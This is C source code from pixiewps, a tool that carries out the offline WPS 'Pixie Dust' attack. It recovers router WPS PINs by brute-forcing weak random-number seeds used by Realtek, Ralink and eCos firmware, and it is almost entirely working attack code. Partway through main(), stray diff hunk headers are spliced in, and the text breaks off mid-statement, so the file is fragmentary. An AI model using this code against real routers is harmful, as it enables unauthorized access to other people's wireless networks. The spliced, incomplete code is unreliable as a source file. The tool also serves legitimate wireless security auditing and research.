#define _POSIX_C_SOURCE 200809L
#define _XOPEN_SOURCE 700
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <stdint.h>
#include <string.h>
#include <getopt.h>
#include <pthread.h>
#include <limits.h>
#include <assert.h>
#if defined(_WIN32) || defined(__WIN32__)
# include <windows.h>
#endif
#ifdef __APPLE__
# define _DARWIN_C_SOURCE
#endif
#include <sys/types.h>
#include <sys/time.h>
#if defined(__APPLE__) || defined(__FreeBSD__)
# include <sys/sysctl.h>
#endif
#include "config.h"
#include "pixiewps.h"
#include "crypto/crypto_internal-modexp.c"
#include "crypto/hmac_sha256.c"
#include "crypto/tc/aes_cbc.h"
#include "random/glibc_random_yura.c"
#include "utils.h"
#include "wps.h"
#include "version.h"
static uint32_t ecos_rand_simplest(uint32_t *seed);
static uint32_t ecos_rand_simple(uint32_t *seed);
static uint32_t ecos_rand_knuth(uint32_t *seed);
static int crack_first_half(struct global *wps, char *pin, const uint8_t *es1_override);
static int crack_second_half(struct global *wps, char *pin);
static int crack(struct global *wps, char *pin);
static const char *option_string = "e:r:s:z:a:n:m:b:o:v:j:5:7:SflVh?";
static const struct option long_options[] = {
	{ "pke",       required_argument, 0, 'e' },
	{ "pkr",       required_argument, 0, 'r' },
	{ "e-hash1",   required_argument, 0, 's' },
	{ "e-hash2",   required_argument, 0, 'z' },
	{ "authkey",   required_argument, 0, 'a' },
	{ "e-nonce",   required_argument, 0, 'n' },
	{ "r-nonce",   required_argument, 0, 'm' },
	{ "e-bssid",   required_argument, 0, 'b' },
	{ "output",    required_argument, 0, 'o' },
	{ "verbosity", required_argument, 0, 'v' },
	{ "jobs",      required_argument, 0, 'j' },
	{ "dh-small",  no_argument,       0, 'S' },
	{ "force",     no_argument,       0, 'f' },
	{ "length",    no_argument,       0, 'l' },
	{ "version",   no_argument,       0, 'V' },
	{ "help",      no_argument,       0,  0  },
	{ "mode",      required_argument, 0,  1  },
	{ "start",     required_argument, 0,  2  },
	{ "end",       required_argument, 0,  3  },
	{ "cstart",    required_argument, 0,  4  },
	{ "cend",      required_argument, 0,  5  },
	{ "m5-enc",    required_argument, 0, '5' },
	{ "m7-enc",    required_argument, 0, '7' },
	{  0,          no_argument,       0, 'h' },
	{  0,          0,                 0,  0  }
};
#define SEEDS_PER_JOB_BLOCK 1000
struct crack_job {
	pthread_t thr;
	uint32_t start;
};
static struct job_control {
	int jobs;
	int mode;
	uint32_t end;
	uint32_t randr_enonce[4];
	struct global *wps;
	struct crack_job *crack_jobs;
	volatile uint32_t nonce_seed;
} job_control;
static void crack_thread_rtl(struct crack_job *j)
{
	uint32_t seed = j->start;
	uint32_t limit = job_control.end;
	uint32_t tmp[4];
	while (!job_control.nonce_seed) {
		if (glibc_fast_seed(seed) == job_control.randr_enonce[0]) {
			if (!memcmp(glibc_fast_nonce(seed, tmp), job_control.randr_enonce, WPS_NONCE_LEN)) {
				job_control.nonce_seed = seed;
				DEBUG_PRINT("Seed found (%10u)", seed);
			}
		}
		if (seed == 0) break;
		seed--;
		if (seed < j->start - SEEDS_PER_JOB_BLOCK) {
			int64_t tmp = (int64_t)j->start - SEEDS_PER_JOB_BLOCK * job_control.jobs;
			if (tmp < 0) break;
			j->start = tmp;
			seed = j->start;
			if (seed < limit) break;
		}
	}
}
struct ralink_randstate {
	uint32_t sreg;
};
static unsigned char ralink_randbyte(struct ralink_randstate *state)
{
	unsigned char r = 0;
	for (int i = 0; i < 8; i++) {
#if defined(__mips__) || defined(__mips)
		const uint32_t lsb_mask = -(state->sreg & 1);
		state->sreg ^= lsb_mask & 0x80000057;
		state->sreg >>= 1;
		state->sreg |= lsb_mask & 0x80000000;
		r = (r << 1) | (lsb_mask & 1);
#else
		unsigned char result;
		if (state->sreg & 0x00000001) {
			state->sreg = ((state->sreg ^ 0x80000057) >> 1) | 0x80000000;
			result = 1;
		}
		else {
			state->sreg = state->sreg >> 1;
			result = 0;
		}
		r = (r << 1) | result;
#endif
	}
	return r;
}
static void ralink_randstate_restore(struct ralink_randstate *state, uint8_t r)
{
	for (int i = 0; i < 8; i++) {
		const unsigned char result = r & 1;
		r = r >> 1;
		if (result) {
			state->sreg = (((state->sreg) << 1) ^ 0x80000057) | 0x00000001;
		}
		else {
			state->sreg = state->sreg << 1;
		}
	}
}
static unsigned char ralink_randbyte_backwards(struct ralink_randstate *state)
{
	unsigned char r = 0;
	for (int i = 0; i < 8; i++) {
		unsigned char result;
		if (state->sreg & 0x80000000) {
			state->sreg = ((state->sreg << 1) ^ 0x80000057) | 0x00000001;
			result = 1;
		}
		else {
			state->sreg = state->sreg <<  1;
			result = 0;
		}
		r |= result << i;
	}
	return r;
}
/* static void ralink_randbyte_backbytes(struct ralink_randstate *state, const int num_bytes)
{
	uint32_t lfsr = bit_revert(state->sreg);
	int k = 8 * num_bytes;
	while (k--) {
		unsigned int lsb_mask = -(lfsr & 1);
		lfsr ^= lsb_mask & 0xd4000003;
		lfsr >>= 1;
		lfsr |= lsb_mask & 0x80000000;
	}
	state->sreg = bit_revert(lfsr);
} */
static int crack_rt(uint32_t start, uint32_t end, uint32_t *result)
{
	uint32_t seed;
	struct ralink_randstate prng;
	unsigned char testnonce[16] = {0};
	unsigned char *search_nonce = (void *)job_control.randr_enonce;
	for (seed = start; seed < end; seed++) {
		int i;
		prng.sreg = seed;
		testnonce[0] = ralink_randbyte(&prng);
		if (testnonce[0] != search_nonce[0]) continue;
		for (i = 1; i < 4; i++) testnonce[i] = ralink_randbyte(&prng);
		if (memcmp(testnonce, search_nonce, 4)) continue;
		for (i = 4; i < WPS_NONCE_LEN; i++) testnonce[i] = ralink_randbyte(&prng);
		if (!memcmp(testnonce, search_nonce, WPS_NONCE_LEN)) {
			*result = seed;
			return 1;
		}
	}
	return 0;
}
static void crack_thread_rt(struct crack_job *j)
{
	uint32_t start = j->start, end;
	uint32_t res;
	while (!job_control.nonce_seed) {
		uint64_t tmp = (uint64_t)start + (uint64_t)SEEDS_PER_JOB_BLOCK;
		if (tmp > (uint64_t)job_control.end) tmp = job_control.end;
		end = tmp;
		if (crack_rt(start, end, &res)) {
			job_control.nonce_seed = res;
			DEBUG_PRINT("Seed found (%10u)", (unsigned)res);
		}
		tmp = (uint64_t)start + (uint64_t)(SEEDS_PER_JOB_BLOCK * job_control.jobs);
		if (tmp > (uint64_t)job_control.end) break;
		start = tmp;
	}
}
static void crack_thread_rtl_es(struct crack_job *j);
static void *crack_thread(void *arg)
{
	struct crack_job *j = arg;
	if (job_control.mode == RTL819x)
		crack_thread_rtl(j);
	else if (job_control.mode == RT)
		crack_thread_rt(j);
	else if (job_control.mode == -RTL819x)
		crack_thread_rtl_es(j);
	else
		assert(0);
	return 0;
}
#if !defined(PTHREAD_STACK_MIN) || PTHREAD_STACK_MIN == 0
static void setup_thread(int i)
{
	pthread_create(&job_control.crack_jobs[i].thr, 0, crack_thread, &job_control.crack_jobs[i]);
}
#else
static size_t getminstacksize(size_t minimum)
{
	return (minimum < PTHREAD_STACK_MIN) ? PTHREAD_STACK_MIN : minimum;
}
static void setup_thread(int i)
{
	size_t stacksize = getminstacksize(64 * 1024);
	pthread_attr_t attr;
	int attr_ok = pthread_attr_init(&attr) == 0 ;
	if (attr_ok) pthread_attr_setstacksize(&attr, stacksize);
	pthread_create(&job_control.crack_jobs[i].thr, &attr, crack_thread, &job_control.crack_jobs[i]);
	if (attr_ok) pthread_attr_destroy(&attr);
}
#endif
static void init_crack_jobs(struct global *wps, int mode)
{
	job_control.wps = wps;
	job_control.jobs = wps->jobs;
	job_control.end = (mode == RTL819x) ? (uint32_t)wps->end : 0xffffffffu;
	job_control.mode = mode;
	job_control.nonce_seed = 0;
	memset(job_control.randr_enonce, 0, sizeof(job_control.randr_enonce));
	/* Convert Enrollee nonce to the sequence may be generated by current random function */
	int i, j = 0;
	if (mode == -RTL819x) ; /* nuffin' */
	else if (mode == RTL819x)
		for (i = 0; i < 4; i++) {
			job_control.randr_enonce[i] |= wps->e_nonce[j++];
			job_control.randr_enonce[i] <<= 8;
			job_control.randr_enonce[i] |= wps->e_nonce[j++];
			job_control.randr_enonce[i] <<= 8;
			job_control.randr_enonce[i] |= wps->e_nonce[j++];
			job_control.randr_enonce[i] <<= 8;
			job_control.randr_enonce[i] |= wps->e_nonce[j++];
		}
	else
		memcpy(job_control.randr_enonce, wps->e_nonce, WPS_NONCE_LEN);
	job_control.crack_jobs = malloc(wps->jobs * sizeof (struct crack_job));
	uint32_t curr = 0;
	if (mode == RTL819x) curr = wps->start;
	else if (mode == RT) curr = 1; /* Ralink LFSR jumps from 0 to 1 internally */
	int32_t add = (mode == RTL819x) ? -SEEDS_PER_JOB_BLOCK : SEEDS_PER_JOB_BLOCK;
	for (i = 0; i < wps->jobs; i++) {
		job_control.crack_jobs[i].start = (mode == -RTL819x) ? (uint32_t)i + 1 : curr;
		setup_thread(i);
		curr += add;
	}
}
static uint32_t collect_crack_jobs()
{
	for (int i = 0; i < job_control.jobs; i++) {
		void *ret;
		pthread_join(job_control.crack_jobs[i].thr, &ret);
	}
	free(job_control.crack_jobs);
	return job_control.nonce_seed;
}
unsigned int hardware_concurrency()
{
#if defined(PTW32_VERSION) || defined(__hpux)
	return pthread_num_processors_np();
#elif defined(__APPLE__) || defined(__FreeBSD__)
	int count;
	size_t size = sizeof(count);
	return sysctlbyname("hw.ncpu", &count, &size, NULL, 0) ? 0 : count;
#elif defined(_SC_NPROCESSORS_ONLN) /* unistd.h */
	int const count = sysconf(_SC_NPROCESSORS_ONLN);
	return (count > 0) ? count : 0;
#elif defined(__GLIBC__)
	return get_nprocs();
#elif defined(_WIN32) || defined(__WIN32__)
	SYSTEM_INFO sysinfo;
	GetSystemInfo(&sysinfo);
	return sysinfo.dwNumberOfProcessors;
#else
	return 0;
#endif
}
static void rtl_nonce_fill(uint8_t *nonce, uint32_t seed)
{
	uint8_t *ptr = nonce;
	uint32_t word0 = 0, word1 = 0, word2 = 0, word3 = 0;
	for (int j = 0; j < 31; j++) {
		word0 += seed * glibc_seed_tbl[j + 3];
		word1 += seed * glibc_seed_tbl[j + 2];
		word2 += seed * glibc_seed_tbl[j + 1];
		word3 += seed * glibc_seed_tbl[j + 0];
		/* This does: seed = (16807LL * seed) % 0x7fffffff
		   using the sum of digits method which works for mod N, base N+1 */
		const uint64_t p = 16807ULL * seed; /* Seed is always positive (31 bits) */
		seed = (p >> 31) + (p & 0x7fffffff);
	}
	uint32_t be;
	be = end_htobe32(word0 >> 1); memcpy(ptr,      &be, sizeof be);
	be = end_htobe32(word1 >> 1); memcpy(ptr +  4, &be, sizeof be);
	be = end_htobe32(word2 >> 1); memcpy(ptr +  8, &be, sizeof be);
	be = end_htobe32(word3 >> 1); memcpy(ptr + 12, &be, sizeof be);
}
static int find_rtl_es1(struct global *wps, char *pin, uint8_t *nonce_buf, uint32_t seed)
{
	rtl_nonce_fill(nonce_buf, seed);
	return crack_first_half(wps, pin, nonce_buf);
}
static void crack_thread_rtl_es(struct crack_job *j)
{
	int thread_id = j->start;
	uint8_t nonce_buf[WPS_SECRET_NONCE_LEN];
	char pin[WPS_PIN_LEN + 1];
	int dist, max_dist = (MODE3_TRIES + 1);
	for (dist = thread_id; !job_control.nonce_seed && dist < max_dist; dist += job_control.jobs) {
		if (find_rtl_es1(job_control.wps, pin, nonce_buf, job_control.wps->nonce_seed + dist)) {
			job_control.nonce_seed = job_control.wps->nonce_seed + dist;
			memcpy(job_control.wps->e_s1, nonce_buf, sizeof nonce_buf);
			memcpy(job_control.wps->pin, pin, sizeof pin);
		}
		if (job_control.nonce_seed)
			break;
		if (find_rtl_es1(job_control.wps, pin, nonce_buf, job_control.wps->nonce_seed - dist)) {
			job_control.nonce_seed = job_control.wps->nonce_seed - dist;
			memcpy(job_control.wps->e_s1, nonce_buf, sizeof nonce_buf);
			memcpy(job_control.wps->pin, pin, sizeof pin);
		}
	}
}
static int find_rtl_es(struct global *wps)
{
	init_crack_jobs(wps, -RTL819x);
	/* Check distance 0 in the main thread, as it is the most likely */
	uint8_t nonce_buf[WPS_SECRET_NONCE_LEN];
	char pin[WPS_PIN_LEN + 1];
	if (find_rtl_es1(wps, pin, nonce_buf, wps->nonce_seed)) {
		job_control.nonce_seed = wps->nonce_seed;
		memcpy(wps->e_s1, nonce_buf, sizeof nonce_buf);
		memcpy(wps->pin, pin, sizeof pin);
	}
	collect_crack_jobs();
	if (job_control.nonce_seed) {
		DEBUG_PRINT("First pin half found (%4s)", wps->pin);
		wps->s1_seed = job_control.nonce_seed;
		char pin_copy[WPS_PIN_LEN + 1];
		strcpy(pin_copy, wps->pin);
		int j;
		/* We assume that the seed used for es2 is within a range of 10 seconds
		   forwards in time only */
		for (j = 0; j < 10; j++) {
			strcpy(wps->pin, pin_copy);
			rtl_nonce_fill(wps->e_s2, wps->s1_seed + j);
			DEBUG_PRINT("Trying (%10u) with E-S2: ", wps->s1_seed + j);
			DEBUG_PRINT_ARRAY(wps->e_s2, WPS_SECRET_NONCE_LEN);
			if (crack_second_half(wps, wps->pin)) {
				wps->s2_seed = wps->s1_seed + j;
				DEBUG_PRINT("Pin found (%8s)", wps->pin);
				return RTL819x;
			}
		}
	}
	return NONE;
}
static void empty_pin_hmac(struct global *wps)
{
	/* Since the empty pin psk is static once initialized, we calculate it only once */
	hmac_sha256(wps->authkey, WPS_AUTHKEY_LEN, NULL, 0, wps->empty_psk);
}

int main(int argc, char **argv)
{
	struct global *wps;
	@@ -600,18 +607,14 @@ int main(int argc, char **argv)
					unsigned int cores = hardware_concurrency();
					struct timeval t_current;
					gettimeofday(&t_current, 0);
					time_t r_time;
					struct tm ts;
					char buffer[30];
					r_time = t_current.tv_sec;
					gmtime_r(&r_time, &ts);
					strftime(buffer, 30, "%c", &ts);
					fprintf(stderr, "\n ");
					printf("Pixiewps %s", LONG_VERSION); fflush(stdout);
					fprintf(stderr, "\n\n"
							" [*] System time: %lu (%s UTC)\n"
							" [*] Number of cores available: %u\n\n",
							(unsigned long) t_current.tv_sec, buffer, cores == 0 ? 1 : cores);
					free(wps->error);
					free(wps);
					return ARG_ERROR;
	@@ -1270,16 +1273,13 @@ int main(int argc, char **argv)

						#if DEBUG
						{
							struct tm ts;
							char buffer[30];
							gmtime_r(&wps->start, &ts);
							strftime(buffer, 30, "%c", &ts);
							printf("\n [DEBUG] %s:%d:%s(): Start: %10lu (%s UTC)",
								__FILE__, __LINE__, __func__, (unsigned long) wps->start, buffer);
							gmtime_r(&wps->end, &ts);
							strftime(buffer, 30, "%c", &ts);
							printf("\n [DEBUG] %s:%d:%s(): End:   %10lu (%s UTC)",
								__FILE__, __LINE__, __func__, (unsigned long) wps->end, buffer);
							fflush(stdout);
						}
						#endif
	@@ -1426,24 +1426,19 @@ int main(int argc, char **argv)
			if (found_p_mode == RTL819x) {
				if (wps->nonce_seed) {
					time_t seed_time;
					struct tm ts;
					char buffer[30];

					printf("\n [*] Seed N1:  %u", wps->nonce_seed);
					seed_time = wps->nonce_seed;
					gmtime_r(&seed_time, &ts);
					strftime(buffer, 30, "%c", &ts);
					printf(" (%s UTC)", buffer);
					printf("\n [*] Seed ES1: %u", wps->s1_seed);
					seed_time = wps->s1_seed;
					gmtime_r(&seed_time, &ts);
					strftime(buffer, 30, "%c", &ts);
					printf(" (%s UTC)", buffer);
					printf("\n [*] Seed ES2: %u", wps->s2_seed);
					seed_time = wps->s2_seed;
					gmtime_r(&seed_time, &ts);
					strftime(buffer, 30, "%c", &ts);
					printf(" (%s UTC)", buffer);
				}
				else {
					printf("\n [*] Seed N1:  -");
